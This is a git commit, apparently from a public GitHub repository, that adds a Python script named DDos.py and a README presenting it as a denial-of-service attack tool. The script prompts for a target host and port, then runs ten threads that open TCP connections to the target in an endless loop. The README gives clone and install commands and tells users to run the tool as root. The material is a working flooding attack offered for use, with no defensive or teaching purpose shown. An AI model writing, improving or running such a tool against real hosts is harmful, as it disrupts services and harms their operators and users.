fa6b5f68166f07f6a370067892fef09a2556dee3
sadraphh <111549574+sadraphh@users.noreply.github.com>
2022-08-19 06:55:43 +0430

    Add files via upload

---
+++ DDos.py
@@ -0,0 +1,83 @@
+#!/usr/bin/python3
+# This code write by sadraphh
+# DDos Attack v1.0.0
+import os
+try:
+   from colorama import Fore,init
+   init()
+except ImportError:
+    os.system("pip3 install colorama")
+import time
+import sys
+import socket
+import threading
+import platform
+system = platform.uname()[0]
+def title():
+    if system == 'Linux':
+      os.system("printf '\033]2;DDos-Attack\a'")
+    elif system == 'Windows':
+        os.system("title DDos-Attack")
+    else:
+         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
+         sys.exit()         
+def cls():
+    if system == 'Windows':
+      os.system("cls")
+    elif system == 'Linux':
+        os.system("clear")
+    else:
+         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
+         sys.exit()
+class color:
+    red = '\033[91m'
+    green = '\033[92m'
+    End = '\033[0m'
+    blue = '\033[33m'
+def menu():
+    title()
+    cls()
+    print(color.green + """
+                    _                 _     _ 
+  ___  __ _  __| |_ __ __ _ _ __ | |__ | |__
+ / __|/ _` |/ _` | '__/ _` | '_ \| '_ \| '_ \
+ \__ \ (_| | (_| | | | (_| | |_) | | | | | | |
+ |___/\__,_|\__,_|_|  \__,_| .__/|_| |_|_| |_|
+                           |_|                \n""" + color.blue + """
+         ----[    CREAT sadraphh   ]---
+        -------[ github :""" + color.blue + """ https://github.com/sadraphh ]-----------""" + color.End)
+    host = input("\nEnter Host: ")
+    time.sleep(1)
+    port = int(input("\nEnter Target port: "))
+    ##################################################
+    UDP_PORT = port
+    time.sleep(1)
+    cls()
+    ip = socket.gethostbyname(host)
+    print(color.red + "=============================================================================\n" + color.End)
+    print("Target IP:", ip)
+    time.sleep(1)
+    print("\nTarget port:", UDP_PORT)
+    print(color.red + "=============================================================================\n" + color.End)
+    time.sleep(2)
+    def run(k):
+        while True:
+             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+             s.connect((host,port))
+             print(f"Packet send To {ip}")
+    for i in range(10):
+        ch = threading.Thread(target=run, args=[i])
+        ch.start()
+if __name__ == '__main__':
+    try:
+        try:
+           menu()
+        except EOFError:
+            print("\nCtrl + D")
+            print("\nExiting...")
+            sys.exit()
+    except KeyboardInterrupt:
+        print("\nCtrl + C")
+        print("\nExiting...")
+        sys.exit()
+# Thanks For using :)
---
+++ README.md
@@ -0,0 +1,54 @@
+# DDos-Attack
+<hr>
+
+This code write by [sadraphh](https://github.com/sadraphh/)
+<br>
+
+```
+                _                 _     _ 
+  ___  __ _  __| |_ __ __ _ _ __ | |__ | |__
+ / __|/ _` |/ _` | '__/ _` | '_ \| '_ \| '_ \
+ \__ \ (_| | (_| | | | (_| | |_) | | | | | | |
+ |___/\__,_|\__,_|_|  \__,_| .__/|_| |_|_| |_|
+                           |_|                
+```
+<br>
+
+## Scr
+[![image](https://cdn.arstechnica.net/wp-content/uploads/2012/08/dirt-jumper-exploit.png)](https://github.com/sadraphh)
+
+### Working...
+[!(https://cloudflare.com/img/learning/ddos/what-is-a-ddos-attack/ntp-amplification-botnet-ddos-attack.png)](https://github.com/sadraphh)
+
+**Installing**
+``` sh
+git clone https://github.com/sadraphh/Leyer4_sP.git
+
+cd DDos-attack
+
+bash install.sh
+
+python DDos.py
+
+```
+
+*****This program runs with root!*****
+
+****Run Root...****
+```
+sudo su
+```
+
+#### Updating...
+```
+cd Update
+
+./update
+```
+
+###### Uninstalling...
+```
+./uninstall.sh
+```
+
+
